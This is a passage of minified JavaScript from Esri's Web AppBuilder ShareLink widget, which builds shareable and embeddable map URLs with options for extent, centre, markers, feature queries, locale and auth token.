// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/ShareLink.html":'\x3cdiv class\x3d"shareLink"\x3e\r\n  \x3cdiv class\x3d"shareLinkOptionsWrapper displaynone"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"backBtn" class\x3d"backBtn"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"linkOptionsTitle"\x3e${nls.linkOptions}\x3c/div\x3e\r\n    \x3cdiv class\x3d"subTitle"\x3e${nls.linkOptionsUrlParameters}\x3c/div\x3e\r\n    \x3cform data-id\x3d"shareOptionsRadios" data-dojo-attach-point\x3d"shareOptionsRadios"\x3e\r\n      \x3cfieldset\x3e\r\n        \x3cdiv class\x3d"optionsRow"\x3e\r\n          \x3cinput data-dojo-attach-point\x3d"currentMapExtent" class\x3d"shareRadios jimu-float-leading jimu-radio-btn" type\x3d"radio" name\x3d"radios" data-id\x3d"currentMapExtent" data-dojo-type\x3d"dijit.form.RadioButton" data-dojo-props\x3d\'checked:true\' checked\x3e\r\n          \x3cdiv class\x3d"labels" data-forid\x3d"currentMapExtent"\x3e${nls.currentMapExtent}\x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"optionsRow" data-dojo-attach-point\x3d"chooseCenterWithLevelRow"\x3e\r\n          \x3cinput data-dojo-attach-point\x3d"chooseCenterWithLevel" class\x3d"shareRadios jimu-float-leading jimu-radio-btn" type\x3d"radio" name\x3d"radios" data-id\x3d"chooseCenterWithLevel" data-dojo-type\x3d"dijit.form.RadioButton"\x3e\r\n          \x3cdiv class\x3d"labels" data-forid\x3d"chooseCenterWithLevel"\x3e${nls.chooseCenterWithLevel}\x3c/div\x3e\r\n          \x3cdiv class\x3d"optionsMore chooseCenterWithLevel_optionsMore"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"chooseCenterWithLevel_marker" class\x3d"markers"\x3e\x3c/div\x3e\r\n            \x3cselect data-dojo-attach-point\x3d"chooseCenterWithLevel_levels" class\x3d"shareSelects" style\x3d"display: none !important;" data-dojo-type\x3d"dijit/form/Select"\x3e\x3c/select\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"optionsRow"\x3e\r\n          \x3cinput data-dojo-attach-point\x3d"chooseCenterWithScale" class\x3d"shareRadios jimu-float-leading jimu-radio-btn" type\x3d"radio" name\x3d"radios" data-id\x3d"chooseCenterWithScale" data-dojo-type\x3d"dijit.form.RadioButton"\x3e\r\n          \x3cdiv class\x3d"labels"\x3e${nls.chooseCenterWithScale}\x3c/div\x3e\r\n          \x3cdiv class\x3d"optionsMore chooseCenterWithScale_optionsMore"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"chooseCenterWithScale_marker" class\x3d"markers"\x3e\x3c/div\x3e\r\n            \x3cselect data-dojo-attach-point\x3d"chooseCenterWithScale_scales" class\x3d"shareSelects" style\x3d"display: none !important;" data-dojo-type\x3d"dijit/form/Select"\x3e\x3c/select\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n\r\n        \x3cdiv class\x3d"optionsRow" data-dojo-attach-point\x3d"findLocationRow"\x3e\r\n          \x3cinput data-dojo-attach-point\x3d"findLocation" class\x3d"shareRadios jimu-float-leading jimu-radio-btn" type\x3d"radio" name\x3d"radios" data-id\x3d"findLocation" data-dojo-type\x3d"dijit.form.RadioButton"\x3e\r\n          \x3cdiv class\x3d"labels"\x3e${nls.findLocation}\x3c/div\x3e\r\n          \x3cdiv class\x3d"optionsMore findLocation_optionsMore"\x3e\r\n            \x3cdiv class\x3d"moreOptions"\x3e\r\n              \x3cinput data-dojo-attach-point\x3d"findLocation_input" data-dojo-type\x3d"dijit.form.TextBox" placeholder\x3d"${nls.findLocation_inputPlaceholder}"\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"optionsRow"\x3e\r\n          \x3cinput data-dojo-attach-point\x3d"queryFeature" class\x3d"shareRadios jimu-float-leading jimu-radio-btn" type\x3d"radio" name\x3d"radios" data-id\x3d"queryFeature" data-dojo-type\x3d"dijit.form.RadioButton"\x3e\r\n          \x3cdiv class\x3d"labels"\x3e${nls.queryFeature}\x3c/div\x3e\r\n          \x3cdiv class\x3d"optionsMore queryFeature_optionsMore"\x3e\r\n            \x3cdiv class\x3d"moreOptions"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"queryFeature_layer" name\x3d"queryFeature_layer" class\x3d"queryFeature_layer"\x3e\x3c/div\x3e\r\n              \x3cselect data-dojo-attach-point\x3d"queryFeature_field" name\x3d"queryFeature_field" data-dojo-type\x3d"dijit/form/Select"\x3e\x3c/select\x3e\r\n              \x3cselect data-dojo-attach-point\x3d"queryFeature_value" name\x3d"queryFeature_value" data-dojo-type\x3d"dijit/form/Select"\x3e\x3c/select\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"optionsRow"\x3e\r\n          \x3cinput data-dojo-attach-point\x3d"addMarker" class\x3d"shareRadios jimu-float-leading jimu-radio-btn" type\x3d"radio" name\x3d"radios" data-id\x3d"addMarker" data-dojo-type\x3d"dijit.form.RadioButton"\x3e\r\n          \x3cdiv class\x3d"labels"\x3e${nls.addMarker}\x3c/div\x3e\r\n          \x3cdiv class\x3d"optionsMore addMarker_optionsMore"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"addMarker_marker" class\x3d"markers"\x3e\x3c/div\x3e\r\n            \x3cdiv class\x3d"moreOptions addMarker_moreOptions"\x3e\r\n              \x3cdiv class\x3d"moreOptionsRow"\x3e\r\n                \x3clabel\x3e${nls.WKID}\x3c/label\x3e\r\n                \x3cinput data-dojo-attach-point\x3d"addMarker_spatialReference" name\x3d"spatialReference" data-dojo-type\x3d"dijit.form.TextBox"\x3e\r\n              \x3c/div\x3e\r\n              \x3cdiv class\x3d"moreOptionsRow"\x3e\r\n                \x3clabel\x3e${nls.popupTitle}\x3c/label\x3e\r\n                \x3cinput data-dojo-attach-point\x3d"addMarker_title" data-dojo-type\x3d"dijit.form.TextBox" placeholder\x3d"${nls.addMarker_titlePlaceholder}"\x3e\r\n              \x3c/div\x3e\r\n              \x3cdiv class\x3d"moreOptionsRow"\x3e\r\n                \x3clabel\x3e${nls.symbol}\x3c/label\x3e\r\n                \x3cinput data-dojo-attach-point\x3d"addMarker_symbolURL" data-dojo-type\x3d"dijit.form.TextBox" placeholder\x3d"${nls.addMarker_symbolURL}"\x3e\r\n              \x3c/div\x3e\r\n              \x3cdiv class\x3d"moreOptionsRow"\x3e\r\n                \x3clabel\x3e${nls.label}\x3c/label\x3e\r\n                \x3cinput data-dojo-attach-point\x3d"addMarker_label" data-dojo-type\x3d"dijit.form.TextBox" placeholder\x3d"${nls.addMarker_label}"\x3e\r\n              \x3c/div\x3e\r\n              \x3cdiv class\x3d"moreOptionsRow displaynone"\x3e\r\n                \x3clabel\x3e${nls.zoomLevel}\x3c/label\x3e\r\n                \x3cdiv class\x3d"table-for-select"\x3e\r\n                  \x3cselect data-dojo-attach-point\x3d"addMarker_level" name\x3d"addMarker_level" data-dojo-type\x3d"dijit/form/Select"\x3e\x3c/select\x3e\r\n                \x3c/div\x3e\r\n              \x3c/div\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/fieldset\x3e\r\n    \x3c/form\x3e\r\n\r\n    \x3cfieldset\x3e\r\n      \x3cdiv class\x3d"optionsRow shareClearFix"\x3e\r\n        \x3cinput data-id\x3d"share-options-overwirteMobileLayout" data-dojo-attach-point\x3d"overwirteMobileLayout" class\x3d"shareCheckBoxes jimu-float-leading" data-dojo-type\x3d"dijit.form.CheckBox" type\x3d"checkbox"\x3e\r\n        \x3cdiv class\x3d"labels"\x3e${nls.overwirteMobileLayout}\x3c/div\x3e\r\n        \x3cdiv class\x3d"optionsMore share-options-overwirteMobileLayout_optionsMore"\x3e\r\n          \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" required\x3d"true"\r\n                 data-dojo-attach-point\x3d"mobileLayout" data-dojo-props\x3d\'style:{width:"100px"}, constraints:{min:300}\'/\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"optionsRow shareClearFix"\x3e\r\n        \x3cinput data-id\x3d"share-options-language" data-dojo-attach-point\x3d"setlanguage" class\x3d"shareCheckBoxes jimu-float-leading" data-dojo-type\x3d"dijit.form.CheckBox" type\x3d"checkbox"\x3e\r\n        \x3cdiv class\x3d"labels"\x3e${nls.language}\x3c/div\x3e\r\n        \x3cdiv class\x3d"optionsMore share-options-language_optionsMore"\x3e\r\n          \x3cselect data-dojo-attach-point\x3d"setlanguage_languages" class\x3d"shareSelects" style\x3d"display:inline-block;" data-dojo-type\x3d"dijit/form/Select"\x3e\x3c/select\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"optionsRow shareClearFix" style\x3d"display: none;"\x3e\r\n        \x3cinput data-id\x3d"share-options-auth" data-dojo-attach-point\x3d"auth" class\x3d"shareCheckBoxes jimu-float-leading" data-dojo-type\x3d"dijit.form.CheckBox" type\x3d"checkbox"\x3e\r\n        \x3cdiv class\x3d"labels"\x3e${nls.auth}\x3c/div\x3e\r\n        \x3cdiv  class\x3d"optionsMore share-options-auth_optionsMore"\x3e\r\n          \x3cinput data-dojo-attach-point\x3d"authtoken" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d\'required:true\'/\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"optionsRow shareClearFix"\x3e\r\n        \x3cdiv class\x3d"subTitle"\x3e${nls.linkPreview}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"preview" class\x3d"preview inputsText" data-dojo-type\x3d"dijit/form/SimpleTextarea" data-dojo-props\x3d\'required:true,readOnly:true\'\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/fieldset\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"shareUrlsWrapper"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"Text"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"linkShare" data-dojo-attach-point\x3d"LinkShareContainer"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"LinkText" class\x3d"subTitle linkToApp"\x3e${nls.shareLinkText}\x3c/div\x3e\r\n      \x3cinput data-dojo-attach-point\x3d"_linkUrlTextBox" class\x3d"shareLinkUrl inputsText" data-dojo-type\x3d"dijit/form/TextBox" data-dojo-props\x3d\'required:true,readOnly:true\'/\x3e\r\n      \x3cdiv class\x3d"shareClearFix"\x3e\r\n        \x3cspan class\x3d"optionsText jimu-float-leading" data-dojo-attach-point\x3d"linkOptions"\x3e${nls.linkOptions}\x3c/span\x3e\r\n        \x3cdiv class\x3d"shareLinkIcons jimu-float-trailing" data-dojo-attach-point\x3d"socialNetworkLinks"\x3e\r\n          \x3cdiv class\x3d"socialNetworkIcons email" data-dojo-attach-event\x3d"click:_toEmail" data-dojo-attach-point\x3d"emailShare" title\x3d"${nls.shareEmail}"\x3e\x3c/div\x3e\r\n          \x3cdiv class\x3d"socialNetworkIcons facebook" data-dojo-attach-event\x3d"click:_toFacebook" data-dojo-attach-point\x3d"FacebookShare" title\x3d"${nls.shareFacebook}"\x3e\x3c/div\x3e\r\n          \x3cdiv class\x3d"socialNetworkIcons twitter" data-dojo-attach-event\x3d"click:_toTwitter" data-dojo-attach-point\x3d"TwitterShare" title\x3d"${nls.shareTwitter}"\x3e\x3c/div\x3e\r\n          \x3cdiv class\x3d"socialNetworkIcons googlePlus" data-dojo-attach-point\x3d"googlePlusShare" title\x3d"${nls.shareGooglePlus}"\x3e\x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"embedShare" data-dojo-attach-point\x3d"EmbedShareContainer"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"embedText" class\x3d"subTitle"\x3e${nls.embed}\x3c/div\x3e\r\n      \x3cinput data-dojo-attach-point\x3d"_embedCodeTextArea" class\x3d"shareEmbedCode inputsText" data-dojo-type\x3d"dijit/form/SimpleTextarea" data-dojo-props\x3d\'required:true,readOnly:true\'/\x3e\r\n      \x3cdiv class\x3d"moreOptions" data-dojo-attach-event\x3d"click:_moreOptionsExpandCollapse"\x3e\r\n        \x3cdiv class\x3d"moreOptionsIcon" data-dojo-attach-point\x3d"MoreOptionsIcon"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"optionsText"\x3e${nls.more}\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"MoreOptionsContainer" class\x3d"moreOptionsContainer inputsText displaynone"\x3e\r\n        \x3cdiv class\x3d"sizeSelect" data-dojo-attach-point\x3d"SizeSelect"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"customSize disable" data-dojo-attach-point\x3d"CustomSizeContainer"\x3e\r\n          \x3cdiv class\x3d"timesConnector"\x3eX\x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv class\x3d"shareTips" data-dojo-attach-point\x3d"shareTips"\x3e\r\n      \x3c!--\x3cdiv class\x3d"infoIcon"\x3e\x3c/div\x3e--\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"shareTipsText" class\x3d"shareTipsText"\x3e${nls.shareToWebTips}\x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/_base/array dojo/dom-class dojo/on dojo/topic dojo/query jimu/utils jimu/shareUtils dojo/_base/config dojo/cookie dojo/text!./templates/ShareLink.html dojo/string dijit/form/Select dijit/form/NumberTextBox dojo/dom-attr dojo/Deferred esri/request esri/tasks/query esri/tasks/QueryTask esri/symbols/PictureMarkerSymbol esri/graphic esri/layers/GraphicsLayer jimu/dijit/FeaturelayerChooserFromMap jimu/dijit/LayerChooserFromMapWithDropbox dijit/form/TextBox dijit/form/Textarea dijit/form/RadioButton dijit/form/Select dijit/form/CheckBox dijit/form/NumberTextBox dijit/form/SimpleTextarea dijit/form/ValidationTextBox".split(" "),
function(r,t,u,v,c,n,e,d,h,g,k,f,w,x,y,p,z,q,l,A,B,C,D,E,F,G,H,I){return r([t,u,v],{templateString:y,declaredClass:"jimu.dijit.ShareLink",bitlyUrl:"https://arcg.is/prod/shorten",share:{shareEmailSubject:"",shareTwitterTxt:"",languages:"ar cs da de en el es et fi fr he hr it ja ko lt lv nb nl pl pt-br pt-pt ro ru sr sv th tr zh-cn vi zh-hk zh-tw".split(" "),DEFAULT_MOBILE_LAYOUT:600},_hasZoomLevelMarkerAdded:!1,_hasMapScaleMarkerAdded:!1,_hasAddMarkerMarkerAdded:!1,HAS_INIT_URL:!1,postMixInProperties:function(){this.inherited(arguments);
this.nls=window.jimuNls.shareLink;this.nls.symbol=window.jimuNls.common.symbol;this.nls.label=window.jimuNls.common.label;this.nls.WKID=window.jimuNls.common.wkid||"wkid";this.nls.popupTitle=window.jimuNls.shareLink.popupTitle||"Pop-up title";this.nls.zoomLevel=window.jimuNls.shareLink.zoomLevel||"Zoom level";this.share.shareEmailSubject=this.nls.shareEmailSubject+" ${appTitle} ";this.share.shareTwitterTxt=this.nls.shareEmailSubject+"${appTitle}\n"},postCreate:function(){this.inherited(arguments);
this._initUI();this._initMap();this._showSocialMediaLinksByConfig()},constructor:function(a){a&&(this._portalUrl=a.portalUrl,this._isOnline=a.isOnline,this._appTitle=a.appTitle,this._isShowBackBtn=a.isShowBackBtn,this._isShowSocialMediaLinks=a.isShowSocialMediaLinks,this._isSharedToPublic=a.isSharedToPublic,this._isShowFindLocation=a.isShowFindLocation,this._config=a.config)},startup:function(){this.baseHrefUrl=f.getBaseHrefUrl(this._portalUrl);"undefined"===typeof this.optionSrc&&(this.optionSrc=
"currentMapExtent");this.updateUrl(null);this._initOptions();this._initOptionsEvent()},destroy:function(){this._cleanMarkerStatus();this._mapClickHandler&&(this._mapClickHandler=null);this.inherited(arguments)},onShareToPublicChanged:function(a){this._isSharedToPublic=a;this.updateUrl(null);this._isSharedToPublic?e.add(this.shareTips,"displaynone"):e.remove(this.shareTips,"displaynone")},onCloseContainer:function(){this._cleanMarkerStatus()},updateShareLinkOptionsUI:function(a){a&&"undefined"!==typeof a.isShowFindLocation&&
this.findLocationRow&&(!1===a.isShowFindLocation?e.add(this.findLocationRow,"displaynone"):!0===a.isShowFindLocation&&e.remove(this.findLocationRow,"displaynone"))},_initMap:function(){window.isBuilder?(this.own(h.subscribe("app/mapLoaded",c.hitch(this,this._onMapLoaded))),this.own(h.subscribe("app/mapChanged",c.hitch(this,this._onMapLoaded)))):(this.own(h.subscribe("mapLoaded",c.hitch(this,this._onMapLoaded))),this.own(h.subscribe("mapChanged",c.hitch(this,this._onMapLoaded))));window._widgetManager.map&&
(this.map=window._widgetManager.map,this._mapEventUpdateUrls(),this._addGraphicsLayer())},_onMapLoaded:function(a){this.map=a;this._mapEventUpdateUrls();this._addGraphicsLayer()},_mapEventUpdateUrls:function(){this.map&&(this.own(d(this.map,"pan-end",c.hitch(this,function(){this._mapEventHandler("pan-end")}))),this.own(d(this.map,"resize",c.hitch(this,function(){this._mapEventHandler("resize")}))),this.own(d(this.map,"zoom-end",c.hitch(this,function(){this._mapEventHandler("zoom-end")}))))},_mapEventHandler:function(){this._isShareLinkOptionsShow()&&
this.updateUrl()},_showSocialMediaLinksByConfig:function(){this._config&&this._config.socialMedias&&("undefined"!==typeof this._config.socialMedias.email&&!1===this._config.socialMedias.email&&e.add(this.emailShare,"displaynone"),"undefined"!==typeof this._config.socialMedias.facebook&&!1===this._config.socialMedias.facebook&&e.add(this.FacebookShare,"displaynone"),"undefined"!==typeof this._config.socialMedias.twitter&&!1===this._config.socialMedias.twitter&&e.add(this.TwitterShare,"displaynone"),
"undefined"!==typeof this._config.socialMedias.googlePlus&&!1===this._config.socialMedias.googlePlus&&e.add(this.googlePlusShare,"displaynone"))},_initUI:function(){this._isShowBackBtn?(l.set(this.backBtn,"title",window.jimuNls.common.back),this.own(d(this.backBtn,"click",c.hitch(this,this._toggleLinkOptions)))):e.add(this.backBtn,"displaynone");!1===this._isShowSocialMediaLinks&&e.toggle(this.socialNetworkLinks,"displaynone");!0===this._isSharedToPublic&&e.toggle(this.shareTips,"displaynone");this.own(d(this.linkOptions,
"click",c.hitch(this,this._toggleLinkOptions)));this._setInputsClicktoSelect(this._linkUrlTextBox);this.own(d(this.googlePlusShare,"click",c.hitch(this,this._toGooglePlus)));this._setInputsClicktoSelect(this._embedCodeTextArea);this._sizeOptions=new z({options:[{label:this.nls.smallSize,value:"small",selected:!0},{label:this.nls.mediumSize,value:"medium",selected:!1},{label:this.nls.largeSize,value:"large",selected:!1},{label:this.nls.customSize,value:"custom",selected:!1}],"class":"sizeOptionsSelect"});
this._sizeOptions.placeAt(this.SizeSelect);this.own(d(this._sizeOptions,"change",function(a){switch(a){case "small":this._widthTextBox.set("value",300);this._heightTextBox.set("value",200);e.add(this.CustomSizeContainer,"disable");this._updateEmbedCodeFrameSize();break;case "medium":this._widthTextBox.set("value",800);this._heightTextBox.set("value",600);e.add(this.CustomSizeContainer,"disable");this._updateEmbedCodeFrameSize();break;case "large":this._widthTextBox.set("value",1080);this._heightTextBox.set("value",
720);e.add(this.CustomSizeContainer,"disable");this._updateEmbedCodeFrameSize();break;case "custom":e.remove(this.CustomSizeContainer,"disable")}}.bind(this)));this._widthTextBox=new q({"class":"sizeTextBox inputsText",value:300,constraints:{pattern:"#",places:0}});this._widthTextBox.placeAt(this.CustomSizeContainer,1);this.own(d(this._widthTextBox,"change",function(a){200>a?this._widthTextBox.set("value",200>a?200:a):this._updateEmbedCodeFrameSize()}.bind(this)));this._heightTextBox=new q({"class":"sizeTextBox inputsText",
value:200,constraints:{pattern:"#",places:0}});this._heightTextBox.placeAt(this.CustomSizeContainer,3);this.own(d(this._heightTextBox,"change",function(a){200>a?this._heightTextBox.set("value",200>a?200:a):this._updateEmbedCodeFrameSize()}.bind(this)));this.mobileLayout.set("value",this.share.DEFAULT_MOBILE_LAYOUT);this.updateShareLinkOptionsUI({isShowFindLocation:this._isShowFindLocation});this._setInputsClicktoSelect(this.preview)},_setLinkUrl:function(a){this._linkUrlTextBox.set("value",a);l.set(this._linkUrlTextBox.domNode,
"data-old",a)},_setEmbedCode:function(a){this._embedCodeTextArea.set("value",'\x3ciframe width\x3d"'+this._widthTextBox.value+'" height\x3d"'+this._heightTextBox.value+'" frameborder\x3d"0" scrolling\x3d"no" allowfullscreen src\x3d"'+a+'"\x3e\x3c/iframe\x3e');l.set(this._embedCodeTextArea.domNode,"data-old-shortened",a)},_updateEmbedCodeFrameSize:function(a){a=this._embedCodeTextArea.get("value");a=a.replace(/width=\"[0-9]*\"/i,'width\x3d"'+this._widthTextBox.value+'"');a=a.replace(/height=\"[0-9]*\"/i,
'height\x3d"'+this._heightTextBox.value+'"');this._embedCodeTextArea.set("value",a)},_initOptions:function(){var a=[],b=this.map.getLevel();"number"===typeof b&&-1!==b?e.remove(this.chooseCenterWithLevelRow,"displaynone"):e.add(this.chooseCenterWithLevelRow,"displaynone");a=[];this.setlanguage_languages.removeOption(this.setlanguage_languages.getOptions());n.forEach(this.share.languages,function(b){var m={label:b,value:b};m.selected=b===w.locale?!0:!1;a.push(m)});this.setlanguage_languages.addOption(a);
b="";try{b=JSON.parse(x("esri_auth")).token}catch(m){console.log("ShareLink can't parse Auth:"+m)}b&&this.authtoken.set("value",b);b=new H({createMapResponse:this.map.webMapResponse,showLayerFromFeatureSet:!1,onlyShowVisible:!1,updateWhenLayerInfosIsShowInMapChanged:!1});e.add(b.domNode,"share-layerChooser-dropbox");this.layerChooserFromMapWithDropbox=new I({layerChooser:b});this.layerChooserFromMapWithDropbox.placeAt(this.queryFeature_layer);this.own(d(this.layerChooserFromMapWithDropbox,"selection-change",
c.hitch(this,this._updateQueryFeature_Layer)));"undefined"!==typeof this.map.spatialReference&&"undefined"!==typeof this.map.spatialReference.wkid&&this.addMarker_spatialReference.set("value",this.map.spatialReference.wkid)},_initOptionsEvent:function(){var a=k.has("ie")||k.has("edge")?"change":"KeyUp",b=g(".shareRadios",this.domNode);this.own(d(b,"click",c.hitch(this,function(a){this.optionSrc=l.get(a.srcElement||a.target,"data-id");this.updateUrl()})));b=g(".shareCheckBoxes",this.domNode);this.own(d(b,
"click",c.hitch(this,function(){this.updateUrl()})));this.own(d(this.chooseCenterWithLevel_levels,"change",c.hitch(this,function(){this.updateUrl()})));this.own(d(this.chooseCenterWithScale_scales,"change",c.hitch(this,function(){this.updateUrl()})));this.own(d(this.setlanguage_languages,"change",c.hitch(this,function(){this.updateUrl()})));this.own(d(this.findLocation_input,a,c.hitch(this,this.updateUrl)));this.own(d(this.queryFeature_field,"change",c.hitch(this,this._updateQueryFeature_Value)));
this.own(d(this.queryFeature_value,"change",c.hitch(this,this.updateUrl)));this.own(d(this.mobileLayout,a,c.hitch(this,this.updateUrl)));this.own(d(this.authtoken,a,c.hitch(this,this.updateUrl)));this.own(d(this.addMarker_marker,"click",c.hitch(this,function(a){this._onMarkersClick(a)})));this.own(d(this.addMarker_spatialReference,"change",c.hitch(this,this.updateUrl)));this.own(d(this.addMarker_title,a,c.hitch(this,this.updateUrl)));this.own(d(this.addMarker_symbolURL,a,c.hitch(this,this.updateUrl)));
this.own(d(this.addMarker_label,a,c.hitch(this,this.updateUrl)));this.own(d(this.addMarker_level,"change",c.hitch(this,this.updateUrl)));this.own(d(this.chooseCenterWithLevel_marker,"click",c.hitch(this,function(a){this._onMarkersClick(a)})));this.own(d(this.chooseCenterWithScale_marker,"click",c.hitch(this,function(a){this._onMarkersClick(a)})))},_onMarkersClick:function(a){this._unselectMarkerBtn();this._selectMarkerBtn(a);this._hidePopup();this._removeGraphicsLayer();this._mapClickHandler=d.once(this.map,
"click",c.hitch(this,this._onMapClick))},_onMapClick:function(a){var b=a.mapPoint;this._addGraphicsLayerMarker(a);"chooseCenterWithLevel"===this.optionSrc?this._hasZoomLevelMarkerAdded=!1:"chooseCenterWithScale"===this.optionSrc?this._hasMapScaleMarkerAdded=!1:"addMarker"===this.optionSrc&&(this._hasAddMarkerMarkerAdded=!1);this._unselectMarkerBtn();this.updateUrl(b);this._showPopup()},_hidePopup:function(){h.publish("ShareLink/onHideContainer")},_showPopup:function(){h.publish("ShareLink/onShowContainer")},
_updateResUrls:function(a){"currentMapExtent"===this.optionSrc?(a=this.getMapExtent(this.map),this.resultUrl=f.addQueryParamToUrl(this.baseHrefUrl,"extent",a,!0)):"chooseCenterWithLevel"===this.optionSrc?(!1===this._hasZoomLevelMarkerAdded&&(this.resultUrl=f.addQueryParamToUrl(this.baseHrefUrl,"center",this.getMapCenter(this.map,a),!0),a&&a.x&&a.y&&(this._hasZoomLevelMarkerAdded=!0)),this.resultUrl=f.addQueryParamToUrl(this.resultUrl,"level",this._getMapLevel(),!0)):"chooseCenterWithScale"===this.optionSrc?
(!1===this._hasMapScaleMarkerAdded&&(this.resultUrl=f.addQueryParamToUrl(this.baseHrefUrl,"center",this.getMapCenter(this.map,a),!0),a&&a.x&&a.y&&(this._hasMapScaleMarkerAdded=!0)),this.resultUrl=f.addQueryParamToUrl(this.resultUrl,"scale",this._getMapScale(),!0)):"findLocation"===this.optionSrc?(a=this.findLocation_input.get("value"),this.resultUrl=f.addQueryParamToUrl(this.baseHrefUrl,"find",a,!0)):"queryFeature"===this.optionSrc?this._updateUrlByQueryFeatures():"addMarker"===this.optionSrc&&(!1===
this._hasAddMarkerMarkerAdded?(this.resultUrl=f.addQueryParamToUrl(this.baseHrefUrl,"marker",this.getMapCenter(this.map,a,null,this._getWkid()),!0),this.resultUrl+=",",a&&a.x&&a.y&&(this._hasAddMarkerMarkerAdded=!0,this._lastAddMarkerParamObj=a)):(this.resultUrl=f.addQueryParamToUrl(this.baseHrefUrl,"marker",this.getMapCenter(this.map,this._lastAddMarkerParamObj,null,this._getWkid()),!0),this.resultUrl+=","),this.resultUrl+=encodeURIComponent(this.addMarker_title.get("value")||""),this.resultUrl+=
",",this.resultUrl+=encodeURIComponent(this.addMarker_symbolURL.get("value")||""),this.resultUrl+=",",this.resultUrl+=encodeURIComponent(this.addMarker_label.get("value")||""),a=this._getMapLevel(),this.resultUrl="number"===typeof a&&-1!==a?f.addQueryParamToUrl(this.resultUrl,"level",this._getMapLevel(),!0):f.addQueryParamToUrl(this.resultUrl,"scale",this._getMapScale(),!0));this.resultUrl=f.removeQueryParamFromUrl(this.resultUrl,"mobileBreakPoint",!0);this.resultUrl=f.removeQueryParamFromUrl(this.resultUrl,
"locale",!0);this.resultUrl=f.removeQueryParamFromUrl(this.resultUrl,"token",!0);this.overwirteMobileLayout.checked&&(this.resultUrl=f.addQueryParamToUrl(this.resultUrl,"mobileBreakPoint",this.mobileLayout.getValue(),!0));this.setlanguage.checked&&(this.resultUrl=f.addQueryParamToUrl(this.resultUrl,"locale",this.setlanguage_languages.getValue(),!0));this.auth.checked&&(this.resultUrl=f.addQueryParamToUrl(this.resultUrl,"token",this.authtoken.getValue(),!0))},_updateUrlByQueryFeatures:function(){var a=
this._getIdFromLayerChoose()||"",b=this.queryFeature_field.get("value"),c=this.queryFeature_value.get("value");this.resultUrl=f.addQueryParamToUrl(this.baseHrefUrl,"query",a,!0);b&&(this.resultUrl+=",",this.resultUrl+=b,c&&(this.resultUrl+=",",this.resultUrl+=c))},_updateQueryFeature_Layer:function(){this._updateUrlByQueryFeatures();this._updateQueryFeature_Field();this._updateQueryFeature_Value();this.updateUrl()},_updateQueryFeature_Field:function(){var a=this._getFieldsFromLayerChoose(),b=[];this.queryFeature_field.removeOption(this.queryFeature_field.getOptions());
n.forEach(a,c.hitch(this,function(a){-1<"esriFieldTypeString esriFieldTypeOID esriFieldTypeSmallInteger esriFieldTypeInteger esriFieldTypeSingle esriFieldTypeDouble".split(" ").indexOf(a.type)&&b.push({label:a.name,value:a.name})}));this.queryFeature_field.addOption(b);this._updateUrlByQueryFeatures();this._updateQueryFeature_Value();this.updateUrl()},_updateQueryFeature_Value:function(){var a=[],b=this.queryFeature_field.get("value");a.push(b);this._query(a,this._getUrlFromLayerChoose(),this.map).then(c.hitch(this,
function(a){var c=[],c=this._getQueryedValues(b,a);this.queryFeature_value.removeOption(this.queryFeature_value.getOptions());this.queryFeature_value.addOption(c);this._updateUrlByQueryFeatures();this.updateUrl()}))},_getIdFromLayerChoose:function(){var a=null,b=this.layerChooserFromMapWithDropbox.getSelectedItem();b&&b.layerInfo&&b.layerInfo.id&&(a=b.layerInfo.id);return a},_getFieldsFromLayerChoose:function(){var a=[],b=this.layerChooserFromMapWithDropbox.getSelectedItem();b&&b.layerInfo&&b.layerInfo.layerObject&&
